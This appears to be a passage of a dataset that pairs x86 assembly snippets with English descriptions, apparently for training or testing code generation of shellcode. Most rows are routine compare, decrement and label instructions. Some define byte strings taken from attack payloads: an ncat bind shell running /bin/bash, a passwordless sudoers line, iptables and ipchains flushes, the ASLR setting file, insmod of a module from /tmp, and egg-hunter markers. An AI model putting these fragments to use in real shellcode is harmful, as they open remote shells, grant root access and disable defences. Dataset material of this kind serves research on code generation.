SNIPPETS	INTENTS
cmp eax, ebx \n je exit	jump to the exit label if the contents of the eax register is equal to the contents of the ebx register
cmp eax, ebx \n je exit	if the contents of the eax register is equal to the contents of the ebx register then jump to the exit label
cmp eax, ebx \n je exit \n add al, 0x3	jump to the exit label if the contents of the eax register is equal to the contents of the ebx register else move the value 0x3 into the al register
cmp eax, ebx \n je exit \n add al, 0x3	if the contents of the eax register is equal to the contents of the ebx register then jump to the exit label else move the value 0x3 into the al register
cmp eax, ebx \n je exit \n mov al, 0x4	jump to the exit label if the contents of the eax register is equal to the contents of the ebx register else move the value 0x4 into the al register
cmp eax, ebx \n je exit \n mov al, 0x4	if the contents of the eax register is equal to the contents of the ebx register then jump to the exit label else move the value 0x4 into the al register
cmp eax, ebx \n je L1	jump to the L1 label if the contents of the eax register is equal to the contents of the ebx register
cmp eax, ebx \n je L1	if the contents of the eax register is equal to the contents of the ebx register then jump to the L1 label
cmp eax, ebx \n jne retry	jump to the retry label if the contents of the eax register is not equal to the contents of the ebx register
cmp eax, ebx \n jne retry	if the contents of the eax register is not equal to the contents of the ebx register then jump to the retry label
cmp eax, edi \n jne infinite	jump to the infinite label if the contents of the eax register is not equal to the contents of the edi register
cmp eax, edi \n jne infinite	if the contents of the eax register is not equal to the contents of the edi register then jump to the infinite label
cmp eax, edi \n jne infinite \n xor eax, eax	jump to the infinite label if the contents of the eax register is not equal to the contents of the edi register else zero out the eax register
cmp eax, edi \n jne infinite \n xor eax, eax	if the contents of the eax register is not equal to the contents of the edi register then jump to the infinite label else zero out the eax register
cmp eax,ebx	compare the contents of eax with ebx
cmp ebp, 0	compare the contents of the ebp register with the value 0
cmp ebx, 0	compare if ebx is zero
cmp ebx, 9 \n ja exit \n jmp loop	jump to the exit label if the unsigned contents of the ebx register is greater than the unsigned value 10 else jump to the loop label
cmp ebx, 9 \n ja exit \n jmp loop	if the unsigned contents of the ebx register is greater than the unsigned value 10 then jump to the exit label else jump to the loop label
cmp ecx, 0	compare ecx to 0
cmp ecx, 0	compare if ecx is zero
cmp ecx, 0h	compare ecx with 0h
cmp ecx, 10	compare if ecx is equal to 10
cmp ecx, 100	compare if ecx is equal to 100
cmp ecx, 100	compare if our counter is equal to 100
cmp ecx, 5	compare ecx with 5
cmp ecx, ebp	compare ecx and ebp
cmp ecx, ebp	compare the contents of the ecx register with the contents of the ebp register
cmp ecx, edx \n ja l1	jump to the l1 label if the unsigned contents of the ecx register is greater than the unsigned contents of the edx register
cmp ecx, edx \n ja l1	if the unsigned contents of the ecx register is greater than the unsigned contents of the edx register then jump to the l1 label else
cmp edi, 0	compare if edi is equal to 0
cmp edx, 0	compare if edx is zero
cmp edx, 0x43 \n ja loop \n push edx	jump to the loop label if the unsigned contents of the edx register is greater than the unsigned value 0x43 else push the contents of the edx register onto the stack
cmp edx, 0x43 \n ja loop \n push edx	if the unsigned contents of the edx register is greater than the unsigned value 0x43 then jump to the loop label else push the contents of the edx register onto the stack
cmp edx, 10	compare whether the edx register has reached 10
cmp edx, 42	compare the contents of edx to 42
cmp edx, 42 \n je short loc_402B13	jump to loc_402B13 if the contents of the edx register is equal to 42
cmp edx, 42 \n je short loc_402B13	if the contents of the edx register is equal to 42 then jump to loc_402B13
cmp edx, ebx	compare the contents of edx and the contents of ebx
cmp edx, ebx \n je 0x8 \n	jump to the memory address 0x8 if the contents of the edx register is equal to the contents of the ebx register
cmp edx, ebx \n je 0x8 \n	if the contents of the edx register is equal to the contents of the ebx register then jump to the memory address 0x8
cmp edx, ebx \n je 0x8 \n mov ebx, edx	jump to the memory address 0x8 if the contents of the edx register is equal to the contents of the ebx register else move the contents of the edx register into the ebx register
cmp edx, ebx \n je 0x8 \n mov ebx, edx	if the contents of the edx register is equal to the contents of the ebx register then jump to the memory address 0x8 else move the contents of the edx register into the ebx register
cmp esi, 10	compare if esi is equal to 10
cmp esi, edx \n je find_egg	jump to the find_egg label if the contents of the esi register is equal to the contents of the edx register
cmp word [ecx], 0x5951	compare the word at the address ecx and 0x5951
code:	define the code label
connect:	define connect function
cont:	define the cont label
contents db 'hello world!', 0h	define a string db and initialize to 'hello world!'
createfile:	declare the createfile label
createfile:	define createfile function
cycle:	declare the cycle label
cycle:	define cycle label
data:	declare the data label
db ',ajm,pk#########'	define the byte string ',ajm,pk#########'
db '/bin/sh'	define a byte string and initialize it to '/bin/sh'
db '/bin/sh#sh#'	define the byte string '/bin/sh#sh#'
db '/proc/sys/kernel/randomize_va_spacex'	define the byte string '/proc/sys/kernel/randomize_va_spacex'
db '/sbin/insmod#/tmp/o.o'	define the byte string '/sbin/insmod#/tmp/o.o'
db '/sbin/ipchains#-f#'	define the byte string '/sbin/ipchains#-f#'
db '/sbin/iptables#-f#'	define the byte string '/sbin/iptables#-f#'
db '/usr/bin/ncat#-lvp1337#-e/bin/bash#aaaabbbbccccdddd'	define the byte string '/usr/bin/ncat#-lvp1337#-e/bin/bash#aaaabbbbccccdddd'
db '0',10	define the byte string '0',10
db 'my.txtx'	define the byte string 'my.txtx'
db '/bin/sh'	define the byte string '/bin/sh'
db '/etc/passwd#'	define the byte string '/etc/passwd#'
db 'all all=(all) nopasswd: all', 0xa	define the byte string 'all all=(all) nopasswd: all'
db 'cp /bin/sh /tmp/sh'	define the byte string 'cp /bin/sh /tmp/sh'
db 'egg mark'	define the byte string 'egg mark'
db 'egg mark'	initialize a string to 'egg mark'
db 'rm -f /tmp/f'	define the byte string 'rm -f /tmp/f'
db 0x3e,0xcd,0x5d,0x75,0x3c,0x3c,0x80,0x75,0x75,0x3c,0x6f,0x76,0x7b	define an array of bytes and initialize it to 0x3e,0xcd,0x5d,0x75,0x3c,0x3c,0x80,0x75,0x75,0x3c,0x6f,0x76,0x7b
db 0x68	declare a byte contining 0x68
db 0x68	declare a byte with no label containing the value 0x68
db 0x80	declare a byte and initialize it to 0x80
db 0x80	declare an unlabeled byte initialized to 0x80
db 0x96,0xf0,0x5d,0x96,0xef,0x60,0x96,0xee,0xbd,0x18,0xda,0x8d	define an array of bytes and initialize it to 0x96,0xf0,0x5d,0x96,0xef,0x60,0x96,0xee,0xbd,0x18,0xda,0x8d
db 0xcd	define a byte and initialize it to 0xcd
db 0xcd	define the byte 0xcd
db 10	declare a byte with no label containing the value 10
db 10	declare an unlabeled byte initialized to 10
dd 0xdeadbeef	define a byte and initialize it to 0xdeadbeef
dec byte dl	decrement the byte at the address dl by one
dec byte dl	decrement the byte in dl
dec cl	decrement the cl register by one
dec cl	decrement the contents of cl
dec cl	decrement the contents of the cl register
dec cl \n jns dup2	decrement the contents of the cl register and jump to the dup2 label if the result is not negative
dec cl \n jns loop_dup	decrement the contents of the cl register and jump to the loop_dup label if the result is not negative
dec cl \n jns loopinghere	decrement the contents of the cl register and jump to the loopinghere label if the result is not negative
dec dl	decrement the dl register by one
dec eax	decrement eax
dec eax	decrement the contents of the eax register
dec eax	decrement the eax register by one
dec eax	subtract one from the contents of eax
dec ebp	decrement ebp
dec ebx	decrement ebx
dec ebx	decrement the ebx register by one
dec ebx	subtract one from the contents of ebx
dec ecx	decrement ecx
dec ecx	decrement ecx by 1
dec ecx	decrement the contents of the ecx register
dec ecx	decrement the ecx register by one
